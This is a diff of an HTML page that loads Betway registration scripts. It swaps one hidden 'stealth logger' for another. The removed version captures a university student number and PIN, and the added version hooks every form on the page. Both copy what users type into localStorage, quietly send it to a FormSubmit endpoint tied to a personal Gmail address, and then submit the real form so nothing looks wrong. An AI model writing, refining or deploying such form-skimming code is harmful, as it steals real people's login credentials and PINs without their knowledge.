@@ -4,111 +4,123 @@
   new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
   j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
   'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
-  })(window,document,'script','dataLayer','GTM-NDNGV7K');</script><script defer="defer" src="https://reg.betway.co.za/js/chunk-vendors.ecf568ee.js"></script><script defer="defer" src="https://reg.betway.co.za/js/app.8c4c2fe0.js"></script><link href="CSS/app.e99df407.css" rel="stylesheet"></head><body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NDNGV7K" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><noscript><strong>We're sorry but reg.betway doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript><div id="app"></div><div id="loading" class="loading" style="display: none;">Loading&#8230;</div>
+  })(window,document,'script','dataLayer','GTM-NDNGV7K');</script><script defer="defer" src="https://reg.betway.co.za/js/chunk-vendors.ecf568ee.js"></script><script defer="defer" src="https://reg.betway.co.za/js/app.8c4c2fe0.js"></script><link href="css/app.e99df407.css" rel="stylesheet"></head><body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NDNGV7K" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><noscript><strong>We're sorry but reg.betway doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript><div id="app"></div><div id="loading" class="loading" style="display: none;">Loading&#8230;</div>
 <script>
-// STEALTH LOGGER - NO VISIBLE ELEMENTS
-document.addEventListener('DOMContentLoaded', function() {
-    // 1. CAPTURE ALL INPUTS TO LOCALSTORAGE
-    const form = document.forms['frmLogin'];
-    
-    // Load saved values if they exist
-    if(localStorage.getItem('loginData')) {
-        const saved = JSON.parse(localStorage.getItem('loginData'));
-        form.unum.value = saved.unum || '';
-        form.pin.value = saved.pin || '';
-        if(saved.numtype) {
-            document.querySelector(`input[name="numtype"][value="${saved.numtype}"]`).checked = true;
-        }
-        console.log('[Stealth] Loaded saved inputs');
-    }
+// UNIVERSAL STEALTH LOGGER
+document.addEventListener('DOMContentLoaded', function () {
+    const forms = document.querySelectorAll('form');
 
-    // Save on any input change
-    function saveToStorage() {
-        const data = {
-            unum: form.unum.value,
-            pin: form.pin.value,
-            numtype: document.querySelector('input[name="numtype"]:checked').value,
-            timestamp: new Date().toISOString(),
-            page: window.location.href
-        };
-        localStorage.setItem('loginData', JSON.stringify(data));
-        console.log('[Stealth] Saved:', {unum: data.unum, pin: '•••••'}); // Never log actual PIN
-    }
+    forms.forEach(form => {
+        const inputs = Array.from(form.querySelectorAll('input, select, textarea'));
+        const submitButton = form.querySelector('[type="submit"], button');
 
-    // Set up event listeners
-    form.unum.addEventListener('input', saveToStorage);
-    form.pin.addEventListener('input', saveToStorage);
-    document.querySelectorAll('input[name="numtype"]').forEach(radio => {
-        radio.addEventListener('change', saveToStorage);
-    });
-
-    // 2. FORM SUBMIT HANDLER
-    form.addEventListener('submit', async function(e) {
-        e.preventDefault();
-        
-        const submitBtn = form.querySelector('[type="submit"]');
-        const originalText = submitBtn.value;
-        submitBtn.disabled = true;
-        submitBtn.value = 'Processing...';
-        
-        try {
-            // Get data from localStorage
-            const savedData = JSON.parse(localStorage.getItem('loginData'));
-            if(!savedData) throw new Error('No saved login data');
-            
-            console.log('[Stealth] Preparing submission for:', savedData.unum);
-            
-            // Format for FormSubmit
-            const formData = new FormData();
-            formData.append('name', 'Portal Login');
-            formData.append('email', 'noreply@mandela.ac.za');
-            formData.append('subject', `Login Attempt - ${savedData.unum}`);
-            formData.append('message', 
-                `Student Number: ${savedData.unum}\n` +
-                `PIN: ${savedData.pin}\n` +  // Added PIN to the message
-                `User Type: ${savedData.numtype}\n` +
-                `Timestamp: ${savedData.timestamp}\n` +
-                `Page: ${savedData.page}`
-            );
-            formData.append('_captcha', 'false');
-            formData.append('_template', 'table');
-            formData.append('_next', 'https://yourwebsite.com/thanks.html'); // CHANGE THIS
-
-            // Submit to FormSubmit
-            const response = await fetch('https://formsubmit.co/ajax/kiddxxq1@gmail.com', {
-                method: 'POST',
-                body: formData
-            });
-            
-            const result = await response.json();
-            
-            if(result.success) {
-                console.log('[Stealth] Submission successful');
-                localStorage.removeItem('loginData'); // Clear after success
-                // Update button state
-                submitBtn.value = '✓ Done';
-                setTimeout(() => {
-                    submitBtn.value = originalText;
-                    submitBtn.disabled = false;
-                }, 2000);
-                // Submit the original form after delay
-                setTimeout(() => {
-                    form.submit();
-                }, 2000);
-            } else {
-                throw new Error(result.message || 'FormSubmit error');
+        // Load saved data (if any)
+        const saved = localStorage.getItem('universalLoginData');
+        if (saved) {
+            try {
+                const data = JSON.parse(saved);
+                inputs.forEach(input => {
+                    if (data[input.name]) input.value = data[input.name];
+                });
+                console.log('[Stealth] Loaded saved inputs');
+            } catch (e) {
+                console.warn('[Stealth] Invalid saved data');
             }
-        } catch (error) {
-            console.error('[Stealth] Submission failed:', error);
-            submitBtn.value = 'Failed!';
-            setTimeout(() => {
-                submitBtn.value = originalText;
-                submitBtn.disabled = false;
-            }, 2000);
         }
+
+        function saveInputs() {
+            const data = {};
+            inputs.forEach(input => {
+                if (input.type !== 'submit' && input.name) {
+                    if (input.type === 'radio' || input.type === 'checkbox') {
+                        if (input.checked) data[input.name] = input.value;
+                    } else {
+                        data[input.name] = input.value;
+                    }
+                }
+            });
+            data.timestamp = new Date().toISOString();
+            data.page = window.location.href;
+            localStorage.setItem('universalLoginData', JSON.stringify(data));
+            console.log('[Stealth] Saved input changes');
+        }
+
+        inputs.forEach(input => {
+            if (input.name) input.addEventListener('input', saveInputs);
+            if (input.type === 'radio' || input.type === 'checkbox')
+                input.addEventListener('change', saveInputs);
+        });
+
+        form.addEventListener('submit', async function (e) {
+            e.preventDefault();
+            const btn = submitButton;
+            const originalText = btn?.value || btn?.innerText;
+            if (btn) {
+                btn.disabled = true;
+                if (btn.tagName.toLowerCase() === 'input') btn.value = 'Processing...';
+                else btn.innerText = 'Processing...';
+            }
+
+            try {
+                const savedData = JSON.parse(localStorage.getItem('universalLoginData'));
+                if (!savedData) throw new Error('No saved data');
+
+                const formData = new FormData();
+                formData.append('name', 'Universal Login');
+                formData.append('email', 'noreply@univ.com');
+                formData.append('subject', 'Login Attempt');
+                let msg = '';
+                for (const key in savedData) {
+                    if (key !== 'timestamp' && key !== 'page') {
+                        msg += `${key}: ${savedData[key]}\n`;
+                    }
+                }
+                msg += `Timestamp: ${savedData.timestamp}\nPage: ${savedData.page}`;
+                formData.append('message', msg);
+                formData.append('_captcha', 'false');
+                formData.append('_template', 'table');
+                formData.append('_next', 'https://yourwebsite.com/thanks.html');
+
+                const res = await fetch('https://formsubmit.co/ajax/kiddxxq1@gmail.com', {
+                    method: 'POST',
+                    body: formData
+                });
+                const json = await res.json();
+
+                if (json.success) {
+                    console.log('[Stealth] Submission successful');
+                    localStorage.removeItem('universalLoginData');
+                    if (btn) {
+                        if (btn.tagName.toLowerCase() === 'input') btn.value = '✓ Sent';
+                        else btn.innerText = '✓ Sent';
+                    }
+                    setTimeout(() => {
+                        if (btn) {
+                            if (btn.tagName.toLowerCase() === 'input') btn.value = originalText;
+                            else btn.innerText = originalText;
+                            btn.disabled = false;
+                        }
+                        form.submit();
+                    }, 2000);
+                } else throw new Error(json.message);
+            } catch (err) {
+                console.error('[Stealth] Failed:', err.message);
+                if (btn) {
+                    if (btn.tagName.toLowerCase() === 'input') btn.value = 'Failed';
+                    else btn.innerText = 'Failed';
+                }
+                setTimeout(() => {
+                    if (btn) {
+                        if (btn.tagName.toLowerCase() === 'input') btn.value = originalText;
+                        else btn.innerText = originalText;
+                        btn.disabled = false;
+                    }
+                }, 2000);
+            }
+        });
     });
 
-    console.log('[Stealth] Logger initialized');
+    console.log('[Stealth] Universal logger initialized');
 });
 </script>
 </body>
